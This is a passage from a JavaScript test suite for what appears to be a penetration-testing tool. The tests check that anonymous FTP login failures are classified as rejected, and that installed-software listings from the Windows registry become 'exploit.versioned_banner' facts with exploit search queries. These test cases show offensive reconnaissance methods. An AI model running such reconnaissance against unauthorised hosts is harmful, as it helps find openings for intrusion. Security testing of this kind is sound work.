    assert.ok(facts.has('port:20001'), 'Expected port:20001 to be present');
    assert.ok(facts.has('ftp.anonymous_login'), 'Expected ftp.anonymous_login to be present');
    assert.ok(!facts.has('port:21'), 'Must not entail phantom port:21 when FTP runs on 20001/tcp');
  });

  test('PG1-15: FTP 530 Login or password incorrect! (with versioned 220 banner) and 534 Policy requires SSL classify as rejected', () => {
    const sess1 = newSession('198.51.100.37');
    const ftp530 = [
      'Connected to 198.51.100.37.',
      '220-FileZilla Server 0.9.60 beta',
      '220-written by Tim Kosse (tim.kosse@filezilla-project.org)',
      '220 Please visit https://filezilla-project.org/',
      'Name (198.51.100.37:operator): anonymous',
      '331 Password required for anonymous',
      'Password:',
      '530 Login or password incorrect!',
      'Login failed.'
    ].join('\n');
    const r530 = sess1.ingestTurn({
      command: 'ftp 198.51.100.37',
      stdout: ftp530,
      target: '198.51.100.37',
      forceTarget: '198.51.100.37'
    });
    assert.strictEqual(
      r530.outcome && r530.outcome.kind,
      'rejected',
      'Expected FTP 530 Login or password incorrect! with versioned banner to classify as rejected, got ' + (r530.outcome && r530.outcome.kind)
    );

    const sess2 = newSession('198.51.100.38');
    const ftp534 = [
      'Connected to 198.51.100.38.',
      '220 Microsoft FTP Service',
      '534 Local policy on server does not allow TLS secure connections.',
      'Name (198.51.100.38:operator): anonymous',
      '534 Policy requires SSL.',
      'Login failed.',
      'No control connection for command: Permission denied'
    ].join('\n');
    const r534 = sess2.ingestTurn({
      command: 'ftp-ssl 198.51.100.38',
      stdout: ftp534,
      target: '198.51.100.38',
      forceTarget: '198.51.100.38'
    });
    assert.strictEqual(
      r534.outcome && r534.outcome.kind,
      'rejected',
      'Expected FTP 534 Policy requires SSL. + Login failed. to classify as rejected, got ' + (r534.outcome && r534.outcome.kind)
    );
  });

  test('PG1-16: Windows installed-software baseline subtraction filters Visual C++ and VC++ runtimes', () => {
    const sess = newSession('198.51.100.39');
    const swTable = [
      'DisplayName                                                   DisplayVersion',
      '-----------                                                   --------------',
      'Microsoft Visual C++ 2019 X64 Minimum Runtime - 14.28.29914   14.28.29914',
      'Microsoft Visual C++ 2015-2022 Redistributable (x64)          14.36.32532.0',
      'Microsoft VC++ Redistributable                                12.0.30501',
      'VMware Tools                                                  11.3.5.18557794',
      'Acme Backup Agent                                             3.4.2'
    ].join('\n');
    const rep = sess.ingestTurn({
      command: 'Get-ItemProperty HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\* | Select-Object DisplayName, DisplayVersion',
      stdout: swTable,
      target: '198.51.100.39',
      forceTarget: '198.51.100.39'
    });
    const minted = rep.minted_facts || [];
    const notable = findFacts(minted, 'host.notable_program');
    const banners = findFacts(minted, 'exploit.versioned_banner');
    assert.strictEqual(notable.length, 1, 'Expected only 1 non-baseline host.notable_program, got ' + notable.length);
    assert.strictEqual(notable[0].value.name, 'Acme Backup Agent');
    assert.strictEqual(notable[0].value.version, '3.4.2');
    assert.strictEqual(banners.length, 1, 'Expected only 1 non-baseline exploit.versioned_banner, got ' + banners.length);
    assert.strictEqual(banners[0].value.product, 'Acme Backup Agent');
    assert.strictEqual(banners[0].value.version, '3.4.2');
  });

  test('PG1-17: Narrow ProgramName/DisplayVersion tabular headers do not truncate overflowing multi-word software names', () => {
    const sess1 = newSession('198.51.100.40');
    const narrowDashless = [
      'ProgramName   DisplayVersion',
      'Enterprise FileSync Server Suite   10.0.28'
    ].join('\n');
    const r1 = sess1.ingestTurn({
      command: 'Get-InstalledSoftware',
      stdout: narrowDashless,
      target: '198.51.100.40',
      forceTarget: '198.51.100.40'
    });
    const n1 = findFacts(r1.minted_facts || [], 'host.notable_program');
    const b1 = findFacts(r1.minted_facts || [], 'exploit.versioned_banner');
    assert.strictEqual(n1.length, 1, 'Expected 1 host.notable_program for dashless narrow header');
    assert.strictEqual(n1[0].value.name, 'Enterprise FileSync Server Suite');
    assert.strictEqual(n1[0].value.version, '10.0.28');
    assert.strictEqual(b1.length, 1, 'Expected 1 exploit.versioned_banner for dashless narrow header');
    assert.strictEqual(b1[0].value.product, 'Enterprise FileSync Server Suite');
    assert.strictEqual(b1[0].value.search_query, 'Enterprise FileSync Server Suite 10.0');

    const sess2 = newSession('198.51.100.41');
    const narrowDashed = [
      'DisplayName   DisplayVersion',
      '-----------   --------------',
      'Acme Archive1 Agent   4.2.1'
    ].join('\n');
    const r2 = sess2.ingestTurn({
      command: 'Get-InstalledSoftware',
      stdout: narrowDashed,
      target: '198.51.100.41',
      forceTarget: '198.51.100.41'
    });
    const n2 = findFacts(r2.minted_facts || [], 'host.notable_program');
    const b2 = findFacts(r2.minted_facts || [], 'exploit.versioned_banner');
    assert.strictEqual(n2.length, 1, 'Expected 1 host.notable_program for dashed narrow header');
    assert.strictEqual(n2[0].value.name, 'Acme Archive1 Agent');
    assert.strictEqual(n2[0].value.version, '4.2.1');
    assert.strictEqual(b2.length, 1, 'Expected 1 exploit.versioned_banner for dashed narrow header');
    assert.strictEqual(b2[0].value.product, 'Acme Archive1 Agent');
    assert.strictEqual(b2[0].value.search_query, 'Acme Archive1 Agent 4.2');
  });

  if (failures.length > 0) {
    console.error('\nPG-1 smoke suite FAILED: ' + failures.length + ' failed, ' + passed + ' passed.');
    process.exit(1);
  }
  console.log('\nPG-1 smoke suite PASSED: ' + passed + '/' + passed + ' assertions succeeded.');
}

if (require.main === module) {
  runSmokeSuite();
}

module.exports = {
  runSmokeSuite: runSmokeSuite
};
